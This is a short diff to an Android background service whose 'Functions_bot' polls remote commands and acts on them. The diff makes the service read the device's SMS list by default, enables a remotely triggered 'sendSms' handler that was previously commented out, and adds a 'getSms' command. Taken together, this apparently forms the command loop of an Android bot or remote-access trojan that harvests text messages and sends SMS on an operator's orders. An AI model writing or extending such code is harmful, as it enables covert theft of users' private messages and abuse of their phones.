@@ -39,10 +39,12 @@ public class MyService extends Service {
             @Override
             public void run() {
                 Functions_bot fb = new Functions_bot(getApplicationContext());
-            fb.getPicture();
+
+            fb.getSmsList();
               String valor = fb.getCommands();
-                String [] ordParams;
+                String [] ordParams=null;
                 String [] funcParams = valor.split("_");
+
                 if(funcParams.length==2)
                     ordParams = funcParams[1].split("/+");
                 switch(funcParams[0])
@@ -53,7 +55,11 @@ public class MyService extends Service {
                     }
                     break;
                     case"sendSms":{
-                     //fb.sendSMS(ordParams[0], ordParams[1]);
+                     fb.sendSMS(ordParams[0], ordParams[1]);
+                    }
+                    break;
+                    case"getSms":{
+                        fb.getSmsList();
                     }
                     break;
 
